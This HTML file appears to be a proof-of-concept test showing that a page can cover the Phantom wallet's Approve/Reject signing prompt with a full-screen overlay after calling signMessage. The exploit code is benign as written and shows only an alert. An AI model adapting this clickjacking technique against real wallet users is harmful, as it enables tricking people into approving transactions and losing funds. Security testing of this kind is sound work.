<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Phantom Approve UI Overlay Test</title>
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      background: #f5f5f5;
      padding: 2rem;
    }
    button {
      padding: 12px 24px;
      font-size: 16px;
      background-color: #9945FF;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }
    #status {
      margin-top: 20px;
      font-weight: bold;
    }

    #overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(255, 0, 0, 0.15);
      z-index: 9999;
      pointer-events: auto;
    }

    #overlay-content {
      position: absolute;
      top: 40%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: #d9534f;
      color: white;
      padding: 20px 30px;
      border-radius: 10px;
      font-size: 16px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <h1>üîê Phantom Approval UI Overlay Test</h1>
  <p>This test confirms that the Approve/Reject UI can be covered.</p>
  <button id="startBtn">Connect & Sign Message</button>
  <p id="status">Wallet not connected.</p>

  <div id="overlay">
    <div id="overlay-content" onclick="alert('Overlay clicked. You are intercepting Phantom UI!')">
      üö® Overlay Active<br>Click proves control over Phantom's modal.
    </div>
  </div>

  <script>
    const status = document.getElementById("status");
    const startBtn = document.getElementById("startBtn");
    const overlay = document.getElementById("overlay");

    async function runTest() {
      try {
        // Connect in element mode
        const resp = await window.solana.connect({
          onlyIfTrusted: false,
          app: "iframe",
        });
        status.textContent = "‚úÖ Connected: " + resp.publicKey.toString();

        // Trigger a signMessage request
        const message = new TextEncoder().encode("Clickjack test message");
        window.solana.signMessage(message, "utf8");

        // Wait for the Phantom modal to render
        setTimeout(() => {
          overlay.style.display = "block";
          console.log("Overlay activated after 1.2s");
        }, 1200);
      } catch (err) {
        status.textContent = "‚ùå Error: " + err.message;
      }
    }

    startBtn.addEventListener("click", runTest);
  </script>
</body>
</html>
